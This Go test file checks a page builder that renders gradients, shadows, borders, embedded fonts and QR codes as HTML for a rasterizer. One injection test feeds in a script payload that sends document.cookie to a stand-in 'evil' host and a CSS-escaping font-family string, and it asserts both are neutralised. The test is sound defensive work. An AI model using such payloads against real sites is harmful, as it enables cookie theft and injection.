package derive

import (
	"strings"
	"testing"

	"github.com/maaxton/waiveo-next/internal/shared/wire"
)

// page_test.go pins the page builder, which is the half of the rasterizer that
// decides WHAT is drawn. It needs no browser, so every one of these runs in CI.

func gradientTextSpec() *wire.DeriveSpec {
	return &wire.DeriveSpec{
		Kind: wire.DeriveKindText, Text: "Hello", FontPx: 96, Color: "#FFFFFF",
		Align: "center", VAlign: "middle",
		Fill:   &wire.DeriveFill{Kind: wire.DeriveFillLinear, From: "#7C3AED", To: "#0EA5E9", AngleDeg: 135},
		Shadow: &wire.DeriveShadow{DY: 12, Blur: 30, Color: "#000000", OpacityPct: 55},
		Border: &wire.DeriveBorder{Radius: 32},
	}
}

// TestBuildPageDrawsTheFiveUnNativeThings is the capability assertion: each of
// the five things a SceneGraph node cannot draw appears in the page.
//
// It asserts on the emitted CSS rather than on pixels because pixels need a
// browser and CI has none — but a missing declaration here is a missing
// capability there, and the browser test (browser_test.go) closes the loop when
// a Chromium is available.
func TestBuildPageDrawsTheFiveUnNativeThings(t *testing.T) {
	cases := []struct {
		name string
		spec *wire.DeriveSpec
		want []string
	}{
		{
			name: "linear gradient",
			spec: gradientTextSpec(),
			want: []string{"linear-gradient(135deg,#7C3AED 0%,#0EA5E9 100%)"},
		},
		{
			name: "radial gradient",
			spec: &wire.DeriveSpec{Kind: wire.DeriveKindRect,
				Fill: &wire.DeriveFill{Kind: wire.DeriveFillRadial, From: "#1E293B", To: "#020617"}},
			want: []string{"radial-gradient(circle at 50% 50%,#1E293B 0%,#020617 100%)"},
		},
		{
			name: "drop shadow",
			spec: gradientTextSpec(),
			want: []string{"box-shadow:0px 12px 30px rgba(0,0,0,0.550)"},
		},
		{
			name: "rounded styled border",
			spec: &wire.DeriveSpec{Kind: wire.DeriveKindRect,
				Fill:   &wire.DeriveFill{Kind: wire.DeriveFillSolid, From: "#FFFFFF"},
				Border: &wire.DeriveBorder{Width: 6, Color: "#7C3AED", Radius: 24}},
			want: []string{"border:6px solid #7C3AED;", "border-radius:24px;"},
		},
		{
			name: "qr symbol",
			spec: &wire.DeriveSpec{Kind: wire.DeriveKindQR, Data: "https://waiveo.local/pair", Color: "#111827"},
			want: []string{"<svg", `shape-rendering="crispEdges"`, `fill="#111827"`},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := BuildPage(Job{Key: tc.name, W: 800, H: 400, Spec: tc.spec})
			if err != nil {
				t.Fatalf("BuildPage: %v", err)
			}
			for _, want := range tc.want {
				if !strings.Contains(p.HTML, want) {
					t.Errorf("the page does not carry %q\n---\n%s", want, p.HTML)
				}
			}
		})
	}
}

// TestBuildPageEmbedsACustomFace is the fifth capability: a font the device does
// not ship, carried into the page as bytes.
//
// The assertion that matters is that the face is INLINE. A page that referenced
// the font by URL would render correctly on the developer's machine (where the
// file happens to be) and silently fall back to a system face anywhere else,
// producing a PNG whose typography is wrong with nothing reporting a fault.
func TestBuildPageEmbedsACustomFace(t *testing.T) {
	p, err := BuildPage(Job{Key: "font", W: 600, H: 200, FontData: []byte("FAKEFONTBYTES"),
		Spec: &wire.DeriveSpec{Kind: wire.DeriveKindText, Text: "x", FontFamily: "Oswald"}})
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	if !strings.Contains(p.HTML, "@font-face{font-family:'Oswald';src:url(data:font/ttf;base64,RkFLRUZPTlRCWVRFUw==)") {
		t.Errorf("the face is not embedded as data:\n%s", p.HTML)
	}
	if !strings.Contains(p.HTML, "font-family:'Oswald',sans-serif;") {
		t.Errorf("the text does not USE the embedded family — an embedded face nothing selects is a font that never applies:\n%s", p.HTML)
	}
	if strings.Contains(p.HTML, "http://") || strings.Contains(p.HTML, "https://") {
		t.Errorf("the page references the network; every derive page must be self-contained:\n%s", p.HTML)
	}
}

// TestShadowInsetKeepsTheShadowInsideTheAuthoredBox is the envelope rule, and it
// is asserted in BOTH directions of the offset because that is where the
// arithmetic is easy to get half-right: a positive dx grows the RIGHT margin and
// a negative dx grows the LEFT one, and a formula that used the absolute value
// would clip exactly one of the two while looking correct in whichever direction
// the author happened to test.
func TestShadowInsetKeepsTheShadowInsideTheAuthoredBox(t *testing.T) {
	cases := []struct {
		name                   string
		s                      *wire.DeriveShadow
		l, tp, r, b            int
		wantLeftIsGreaterRight bool
	}{
		{name: "no shadow", s: nil},
		{name: "symmetric blur", s: &wire.DeriveShadow{Blur: 10}, l: 10, tp: 10, r: 10, b: 10},
		{name: "offset right/down", s: &wire.DeriveShadow{DX: 4, DY: 6, Blur: 10}, l: 6, tp: 4, r: 14, b: 16},
		{name: "offset left/up", s: &wire.DeriveShadow{DX: -4, DY: -6, Blur: 10}, l: 14, tp: 16, r: 6, b: 4},
		{name: "offset beyond blur", s: &wire.DeriveShadow{DX: 30, Blur: 5}, l: 0, tp: 5, r: 35, b: 5},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			l, tp, r, b := ShadowInset(tc.s)
			if l != tc.l || tp != tc.tp || r != tc.r || b != tc.b {
				t.Errorf("ShadowInset = (%d,%d,%d,%d), want (%d,%d,%d,%d)", l, tp, r, b, tc.l, tc.tp, tc.r, tc.b)
			}
		})
	}
}

// TestBuildPageInsetsTheContentByTheShadow proves the inset reaches the page:
// the styled box is positioned inside the capture rather than filling it, and
// the capture stays exactly the authored geometry.
func TestBuildPageInsetsTheContentByTheShadow(t *testing.T) {
	p, err := BuildPage(Job{Key: "inset", W: 1000, H: 400, Spec: &wire.DeriveSpec{
		Kind: wire.DeriveKindRect,
		Fill: &wire.DeriveFill{Kind: wire.DeriveFillSolid, From: "#FFFFFF"},
		// left 20, top 30, right 20, bottom 10 → box 960x360 at (20,30).
		Shadow: &wire.DeriveShadow{DY: -10, Blur: 20},
	}})
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	if !strings.Contains(p.HTML, "left:20px;top:30px;width:960px;height:360px;") {
		t.Errorf("the box is not inset by its own shadow:\n%s", p.HTML)
	}
	if p.ClipW != 1000 || p.ClipH != 400 {
		t.Errorf("clip = %dx%d, want the authored 1000x400 — the PNG becomes an image layer of that exact geometry, so anything else is silently rescaled on the panel", p.ClipW, p.ClipH)
	}
}

// TestBuildPageRefusesAShadowLargerThanItsLayer: the inset rule has a floor, and
// crossing it must be an error rather than a negative box. A negative width
// renders as a zero-size element, which produces a fully transparent PNG — the
// exact symptom the blank-capture guard exists to catch, arriving from a cause
// that guard cannot explain.
func TestBuildPageRefusesAShadowLargerThanItsLayer(t *testing.T) {
	_, err := BuildPage(Job{Key: "toosmall", W: 40, H: 40, Spec: &wire.DeriveSpec{
		Kind:   wire.DeriveKindRect,
		Fill:   &wire.DeriveFill{Kind: wire.DeriveFillSolid, From: "#FFFFFF"},
		Shadow: &wire.DeriveShadow{Blur: 40},
	}})
	if err == nil {
		t.Fatal("BuildPage accepted a layer with no room for its own shadow")
	}
	if !strings.Contains(err.Error(), "shadow") {
		t.Errorf("the refusal does not name the cause: %v", err)
	}
}

// TestBuildPageRefusesAQRTooSmallToScan: a symbol whose modules would be
// sub-pixel is refused. Rendering it anyway produces a picture that looks like a
// QR code, passes every automated check, and cannot be scanned — which is
// exactly the failure nobody notices until the sign is on a wall.
func TestBuildPageRefusesAQRTooSmallToScan(t *testing.T) {
	_, err := BuildPage(Job{Key: "tiny", W: 20, H: 20, Spec: &wire.DeriveSpec{
		Kind: wire.DeriveKindQR, Data: "https://waiveo.local/pair/ABCD-1234",
	}})
	if err == nil {
		t.Fatal("BuildPage accepted a QR layer too small for one pixel per module")
	}
}

// TestBuildPageIsDeterministic is the property content-addressing rests on: the
// same job must produce byte-identical markup, or the same design re-uploads as
// a new asset on every run and the origin grows without bound.
func TestBuildPageIsDeterministic(t *testing.T) {
	j := Job{Key: "d", W: 900, H: 300, Spec: gradientTextSpec()}
	first, err := BuildPage(j)
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	for i := 0; i < 20; i++ {
		again, err := BuildPage(j)
		if err != nil {
			t.Fatalf("BuildPage (repeat %d): %v", i, err)
		}
		if again.HTML != first.HTML {
			t.Fatalf("repeat %d produced different markup — the page builder is not deterministic", i)
		}
	}
}

// TestBuildPageNeutralisesAuthoredText is the injection case. Authored text and
// a font-family name are the only free-form strings that reach the page, the
// page is run by a REAL BROWSER on the operator's own machine, and the tool is
// pointed at a box whose casts may have been authored by someone else.
func TestBuildPageNeutralisesAuthoredText(t *testing.T) {
	p, err := BuildPage(Job{Key: "xss", W: 800, H: 200, Spec: &wire.DeriveSpec{
		Kind:       wire.DeriveKindText,
		Text:       `</span><script>fetch('http://evil/'+document.cookie)</script>`,
		FontFamily: `x';}#box{display:none}@import url('http://evil/`,
	}})
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	if strings.Contains(p.HTML, "<script>") {
		t.Errorf("authored text reached the page as markup:\n%s", p.HTML)
	}
	// The family name survives only as letters: everything that could close the
	// quoted string, end the declaration, close the rule or start a new at-rule
	// is gone, so it cannot become CSS. `url(` is checked too, because no font
	// was supplied here — its only appearance would be one the name smuggled in.
	fam := quotedFamily(t, cssDeclaration(t, p.HTML, "font-family:"))
	for _, bad := range []string{"'", "\"", ";", "{", "}", "@", "(", ")", ":", "/"} {
		if strings.Contains(fam, bad) {
			t.Errorf("a font-family name escaped its CSS string (%q survives in %q)", bad, fam)
		}
	}
}

// quotedFamily returns the text INSIDE the quotes of a font-family declaration.
// The surrounding quotes are the delimiter, not part of the untrusted value, so
// asserting over the whole declaration would flag the delimiter itself.
func quotedFamily(t *testing.T, decl string) string {
	t.Helper()
	i := strings.IndexByte(decl, '\'')
	if i < 0 {
		t.Fatalf("the font-family value is not quoted: %q", decl)
	}
	rest := decl[i+1:]
	j := strings.IndexByte(rest, '\'')
	if j < 0 {
		t.Fatalf("the font-family value's quote is never closed — the name broke out: %q", decl)
	}
	return rest[:j]
}

// cssDeclaration pulls one declaration out of the page so an assertion can be
// made about its VALUE rather than about the whole document — a substring search
// over the document cannot tell a dangerous character inside the value from the
// same character legitimately elsewhere in the markup.
func cssDeclaration(t *testing.T, page, prop string) string {
	t.Helper()
	i := strings.Index(page, prop)
	if i < 0 {
		t.Fatalf("the page carries no %s declaration:\n%s", prop, page)
	}
	rest := page[i+len(prop):]
	j := strings.IndexByte(rest, ';')
	if j < 0 {
		t.Fatalf("the %s declaration is unterminated:\n%s", prop, page)
	}
	return rest[:j]
}

// TestBuildPageRefusesAnInvalidSpec: the page builder runs the SAME
// wire.ValidateDeriveSpec the authoring surface does, rather than trusting that
// whatever reached it was already checked. The tool is pointed at a server by
// an operator, so "the server validated it" is an assumption about a remote
// party.
func TestBuildPageRefusesAnInvalidSpec(t *testing.T) {
	for _, tc := range []struct {
		name string
		spec *wire.DeriveSpec
	}{
		{"unknown kind", &wire.DeriveSpec{Kind: "hologram"}},
		{"qr with no data", &wire.DeriveSpec{Kind: wire.DeriveKindQR}},
		{"text with no text", &wire.DeriveSpec{Kind: wire.DeriveKindText}},
		{"rect with no fill", &wire.DeriveSpec{Kind: wire.DeriveKindRect}},
		{"bad colour", &wire.DeriveSpec{Kind: wire.DeriveKindText, Text: "x", Color: "red"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := BuildPage(Job{Key: tc.name, W: 400, H: 200, Spec: tc.spec}); err == nil {
				t.Fatal("BuildPage accepted an invalid spec")
			}
		})
	}
}

// TestQuietZoneContrastsWithTheModules: the light field around a symbol is
// derived from the module colour, not from the layer's fill. White modules over
// a dark slide need a BLACK quiet zone; the obvious implementation (always
// white) produces an unscannable inverted symbol, and it looks fine.
func TestQuietZoneContrastsWithTheModules(t *testing.T) {
	dark, err := BuildPage(Job{Key: "dark-modules", W: 400, H: 400,
		Spec: &wire.DeriveSpec{Kind: wire.DeriveKindQR, Data: "x", Color: "#000000"}})
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	if !strings.Contains(dark.HTML, `<rect width="29" height="29" fill="#FFFFFF"/>`) {
		t.Errorf("dark modules did not get a light field:\n%s", dark.HTML)
	}
	light, err := BuildPage(Job{Key: "light-modules", W: 400, H: 400,
		Spec: &wire.DeriveSpec{Kind: wire.DeriveKindQR, Data: "x", Color: "#FFFFFF"}})
	if err != nil {
		t.Fatalf("BuildPage: %v", err)
	}
	if !strings.Contains(light.HTML, `<rect width="29" height="29" fill="#000000"/>`) {
		t.Errorf("light modules did not get a dark field:\n%s", light.HTML)
	}
}
